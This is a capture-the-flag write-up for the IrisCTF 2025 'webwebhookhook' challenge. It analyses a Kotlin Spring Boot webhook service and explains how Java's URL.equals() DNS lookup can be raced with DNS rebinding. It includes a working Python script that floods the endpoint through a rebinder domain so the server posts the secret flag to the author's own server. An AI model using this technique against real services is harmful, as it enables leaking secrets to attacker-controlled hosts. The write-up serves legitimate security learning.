---
date: 2025-01-12T00:00:00+01:00
title: IrisCTF 2025 - webwebhookhook
summary: Writeup for webwebhookhook web challenge of IrisCTF 2025
categories: ["web"]
difficulty: "medium"
tags: ["writeup", "DNS rebinding", "race condition", "TOCTOU"]
---

{{< alert icon="fire" >}}
**Update**:  
This writeup was selected as one of the winners of the Iris CTF 2025 writeup competition --> https://discord.com/channels/1051808836593397781/1051815606732738590/1333226270699294800  
{{< /alert >}}

## TL;DR
The challenge consisted in exploiting a **TOCTOU** race condition by using **DNS rebinding** to bypass `URL.equals()` check in Java. 

## Description
> I made a service to convert webhooks into webhooks.

## Source code analysis
Upon extracting the challenge attachments, it will present itself as a Kotlin-based Spring Boot application with very minimal code.  
In fact the only relevant files to us are `WebwebhookhookApplication.kt`, `State.kt` and `controller/MainController.kt`.

**State.kt**
```kotlin {lineNos=inline}
package tf.irisc.chal.webwebhookhook

import java.net.URI
import java.net.URL

class StateType(
        hook: String,
        var template: String,
        var response: String
        ) {
    var hook: URL = URI.create(hook).toURL()
}

object State {
    var arr = ArrayList<StateType>()
}
```
The `StateType` class is being defined to store an `hook` URL, a mutable `template` string and a mutable `response` string. Note that in the constructor, the `hook` declaration is being shadowed by `var hook: URL = URI.create(hook).toURL()`, meaning that it will accept hook parameter as string but it'll be casted as an `URL` object immediately.  
The `StateType` class is later used as Collection argument for `ArrayList` stored inside `State.arr`.  
The `State` object is defined as singleton, meaning there is exactly one instance of `State` in the entire application.  
This pattern effectively gives the application a simple in-memory database of all registered hooks and their associated templates.

**WebwebhookhookApplication.kt**
```kotlin {lineNos=inline}
package tf.irisc.chal.webwebhookhook

import org.springframework.boot.autoconfigure.SpringBootApplication
import org.springframework.boot.runApplication

@SpringBootApplication
class WebwebhookhookApplication

const val FLAG = "irisctf{test_flag}";

fun main(args: Array<String>) {
    State.arr.add(StateType(
            "http://example.com/admin",
            "{\"data\": _DATA_, \"flag\": \"" + FLAG + "\"}",
            "{\"response\": \"ok\"}"))
    runApplication<WebwebhookhookApplication>(*args)
}
```
This is the main entry point for the application. Here an entry is being added in the global `State` object, using: 
- `http://example.com/admin` as value for the `hook` parameter.
- `{"data": _DATA_, "flag": "irisctf{test_flag}"}` as value for the `template` string.
- `{"response": "ok"}` as value for the `response` string.  

Let's analyze the application further to understand how we might be able to read that flag.

**controller/MainController.kt**
```kotlin {lineNos=inline}
package tf.irisc.chal.webwebhookhook.controller

import org.springframework.http.MediaType
import org.springframework.stereotype.Controller
import org.springframework.ui.Model
import org.springframework.web.bind.annotation.*
import tf.irisc.chal.webwebhookhook.State
import tf.irisc.chal.webwebhookhook.StateType
import java.net.HttpURLConnection
import java.net.URI

@Controller
class MainController {

    @GetMapping("/")
    fun home(model: Model): String {
        return "home.html"
    }

    @PostMapping("/webhook")
    @ResponseBody
    fun webhook(@RequestParam("hook") hook_str: String, @RequestBody body: String, @RequestHeader("Content-Type") contentType: String, model: Model): String {
        var hook = URI.create(hook_str).toURL();
        for (h in State.arr) {
            if(h.hook == hook) {
                var newBody = h.template.replace("_DATA_", body);
                var conn = hook.openConnection() as? HttpURLConnection;
                if(conn === null) break;
                conn.requestMethod = "POST";
                conn.doOutput = true;
                conn.setFixedLengthStreamingMode(newBody.length);
                conn.setRequestProperty("Content-Type", contentType);
                conn.connect()
                conn.outputStream.use { os ->
                    os.write(newBody.toByteArray())
                }

                return h.response
            }
        }
        return "{\"result\": \"fail\"}"
    }

    @PostMapping("/create", consumes = [MediaType.APPLICATION_JSON_VALUE])
    @ResponseBody
    fun create(@RequestBody body: StateType): String {
        for(h in State.arr) {
            if(body.hook == h.hook)
                return "{\"result\": \"fail\"}"
        }
        State.arr.add(body)
        return "{\"result\": \"ok\"}"
    }
}
```
The router for the Spring Boot Application is configured to have the `/create` and the `/webhook` endpoints.
1) The `/create` endpoint accepts `POST` requests with `application/json` body that will be casted as `StateType`. Then it checks if an entry with same hook is already occurring in the global `State` object, and if so, it will return a json response of `{"result": "fail"}`. After iterating the `ArrayList`, if no matching instances were found, a new `StateType` entry will be appended.  
Essentially, this endpoint registers a new webhook configuration, unless it already exists.
2) The `/webhook` endpoint will accept `POST` requests with a `hook` parameter. It will iterate over the `State.arr` global list of previously created webhook configurations, and if it finds a matching `hook` URL, it will replace the `_DATA_` placeholder in the template with the content of the supplied body, and send a POST request to the given `hook` URL using `HttpURLConnection` with the new body. If the `hook` URL is not found in the `State.arr`, it will return a json response of `{"result": "fail"}`.


{{< alert >}}
**Note**  
Both endpoints do not provide SSRF protections, however it's irrelevant for us as there are no additional services running on the server.
{{< /alert >}}


## Vulnerability discovery
At first glance, there doesn't seem to be an obvious way to intercept the flag, since the only way would be to successfully match the hook check and send the `POST` to `example.org`, which would be ez game if we were the admins of domain, which is not the case :P  
One of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of `_DATA_`, to build a request like this:

![Smuggling attempt on body content.](./img/h2_attempt.png "Smuggling attempt on body content.")

However, we note how the body of the request is correctly set based on the length of our payload at **L31** with `conn.setFixedLengthStreamingMode(newBody.length)` consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/

Finally, in a scenario of arbitrary write in the system we could have tried to overwrite `/etc/hosts` file to override the DNS resolution of `example.org` and make it point to an IP under our control, but again, this is not the case for the challenge.

### Doomscrolling remembrance of a random tweet to win
At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons...  

> Wait did I say "domain check bypass" and "url comparison" !?  

That's exactly what I said to myself while overthinking the challenge and immediately after I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two `URL` objects in Java triggers a DNS resolution 💀  

{{< twitter user="ChShersh" id="1832688521762496747" >}}

**More of that is discussed at the end of the writeup [here](#extra).** 

At this point this enlightenment gave me a clear path to the resolution using **DNS rebinding**:
- 1) submit to `/endpoint` a domain like `rbndr.us` that resolves to the IP of `example.com`.
- 2) `URL.equals()` will trigger a DNS resolution on `rbndr.us` that will make succeed the check against `example.com`.
- 3) make the `rbndr.us` domain resolve to different IP under our control.
- 4) the `POST` request will be sent to the IP under our control, with the template body containing the flag.

Yep. That's it. Simple as that right?  
🥲  
No. 🥲

Well, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like `rbndr.us` I was able to get different response status codes from the server (because different domains were resolved each time).  
This behavior was caused by the under the hood work of [rbndr](https://github.com/taviso/rbndr), which as explained on their repo, all it does is simply provide a domain that resolves to IP **A** with a very low TTL, and then immediately switches the DNS resolution to IP **B** so that when a new DNS query is made to the same domain the second time it'll point a different IP address.  
All of that is the basics of how a DNS rebinding attack works, which you can read more about [here](https://github.com/taviso/rbndr?tab=readme-ov-file#rbndr).

The main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a **Time-of-check to time-of-use (TOCTOU) type race** when:  
**1)** the domain DNS resolves to `example.org` IP to make the `URL.equals()` succeed  
and  
**2)** the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.  

### TOCTOU race + DNS cache revalidation
Unfortunately for my sanity, as we can see from the code between **L23** and **L25**, trying to exploit such a window between the check and the socket connection, meant finding a precision of a matter of milliseconds.

```kotlin {lineNos=inline, lineNoStart=23}
if(h.hook == hook) {
    var newBody = h.template.replace("_DATA_", body);
    var conn = hook.openConnection() as? HttpURLConnection;
```

Moreover, Java's built-in DNS cache mechanism made things even more complicated.  
While testing my basic DNS rebinding primitive, I noticed that I was getting the same status code in response to the `/webhook` endpoint for a period of 30 seconds. This sounded a bit strange to me since my DNS server was configured to reply with a 1 second TTL. In fact, what I did was a quick sanity check using both curl and python, and from both these clients the response to my rebinder domain kept changing every second:  

![DNS test](./img/dns_python_test.png "Python DNS test: caching NOT enabled")

![DNS test](./img/dns_java_test.png "Java DNS test: caching enabled")

!["*idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i'm dossing example.org 💀*"](./img/foggia.png "*\"idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i'm dossing example.org\"* 💀")


Clearly some caching was at work in the Java side. It turns out that Java caches a DNS resolution for 30 seconds, which meant that we wanted to get our timing right when sending payload to the `/webhook` endpoint, so that **the cache would be fetched at the time of comparison against example.org, to be invalidated immediately afterwards, thus requiring a cache revalidation at the time of the socket connection to send the flag to a domain under our control.**  
Below I've illustrated the attack workflow.

<div style="background-color:white; padding: 20px">
{{< mermaid >}}
sequenceDiagram
    title DNS Rebinding attack flow on Java `URL.equals()`

    participant Attacker as Attacker
    participant ChallengeServer as Challenge Server
    participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us)
    participant DNS as Attacker DNS Server

    Attacker->>ChallengeServer: POST /endpoint <br/> ?hook=xxxx.rbndr.us

    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
    note over DNS: ...

    note over ChallengeServer: 1) the server code uses <br/>URL.equals() to compare <br/>“xxxx.rbndr.us” vs “example.org”
    ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
    note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
    DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14

    note over ChallengeServer: 3) URL.equals() returns true <br/> because IP matches example.org <br/>
    note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
    note over ChallengeServer: 4) hook.openConnection() <br/> where hook=xxxx.rbndr.us <br/>
    ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
    
    note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP) <br> DNS “rebinding” event, xxxx.rbndr.us is resolving to Attacker's IP
    DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16
    
    note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16 
    note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
    note over DNS: ...
    
    ChallengeServer->>Attacker: POST to 83.130.170.16 <br/> {"flag":"irisctf{...}"} 
    Attacker-->>Attacker: Captures the flag (win)
{{< /mermaid >}}
</div>

A trick I used to increase my chances of hitting the exact window between **Step 1** and **Step 4** was to send a large payload in the body to be processed, so that **L34** would have a slightly longer execution time to give us the possibility of hitting the cache revalidation switch in a larger window.

{{< alert >}}
**NOTE**  
An interesting rabbit hole would be to understand how `String.replace()` is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of `h.template.replace("_DATA_", body)` even more.
{{< /alert >}}

## Exploitation (cry and pray)
Having gathered all the elements to exploit, I proceeded to write the following python script:

**exploit.py**
```python
#!/usr/bin/python3
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

RBNDR = "http://5db8d70e.5e82aa10.rbndr.us"
CHALL_URL = "https://webwebhookhook-43435a7246999280.i.chal.irisc.tf"
BATCH_SIZE = 20
DELAY_BETWEEN_BATCHES = 0.1

req_id = 0
req_id_lock = threading.Lock()

def send_request(session, url, payload):
    global req_id
    try:
        response = session.post(url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data=payload, timeout=10)
        with req_id_lock:
            req_id += 1
            current_id = req_id
        print(f"{current_id} {response.text} {response.status_code}")
    except Exception as e:
        with req_id_lock:
            req_id += 1
            current_id = req_id
        print(f"{current_id} Error: {e}")

def main():
    url = f"{CHALL_URL}/webhook?hook={RBNDR}/admin" # we need to also match url path 
    payload = "A"*1000

    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor:
            while True:
                futures = [
                    executor.submit(send_request, session, url, payload)
                    for _ in range(BATCH_SIZE)
                ]

                for future in as_completed(futures):
                    pass 

                time.sleep(DELAY_BETWEEN_BATCHES)

if __name__ == "__main__":
    main()
```

A little bit of explanation for it:
- The `RBNDR` url was constructed with a [rebinder service](https://lock.cmpxchg8b.com/rebinder.html) using the `example.com` IP as the first IP and my VPS IP as the second IP.
- I opted for a requests batched approach to have an high density of requests in a short time window.
- Large body payload to increase the execution time of `h.template.replace("_DATA_", body)` and thus increasing the duration of the target window. 
- Spamming the `/webhook` to have different DNS cache revalidation timings and increase the chances of an IP switch happening inside the target window.

So, at this point i just run the exploit, prayed and went to have lunch, aaand when i got back i saw this in my VPS console output

![Request with the flag received on the VPS](./img/flag.png "Request with the flag received on the VPS")

## Extra

### But why the hell does Java do DNS resolutions on simple `==` comparisons?
While many weird Java behaviors could be simply explained with the phrase *"because Java."* I wanted to try to justify why the Java devs choose to do DNS resolutions on simple equal comparisons.  
Let's start from the fact that mainly in Java everything is an object allocated in the heap, except for primitives like `int`, `char`, `byte`, `long`, `String` and a few more. Therefore when the JVM has to do comparison of two objects, to see if those two objects are equal, it must check that they are equal in every way. In fact, if you create two objects of two identical classes, their comparison will return false because they have different references in memory.  
As a result Java devs probably said something like *"you don't like it? jk what? Implement the damn comparison by yourself"*. So practically every object in Java has its own magic method `.equals()` which corresponds to its custom implementation to do more intelligent checks and not make two objects have to be just two deep copies to be equal.  
Whoever wrote the `URL` class thought well that to effectively check that two URL objects are equal, they not only must have every property in common (path, protocol, port, ...) but must also resolve to the same IP. To find out this, obviously Java needs to perform a DNS resolution.  
Questionable choice? Absolutely.  
This is what it is anyway? Yes and we have to live with it and in case we simply want to compare two URLs as strings we should use the `URI` class.  

**Fun Fact**: as someone said in this not so happy discussion about this behavior [here](https://news.ycombinator.com/item?id=21765788), that choice was originally made to prevent DNS rebinding attacks.  

---
Flag: `irisctf{url_equals_rebind}`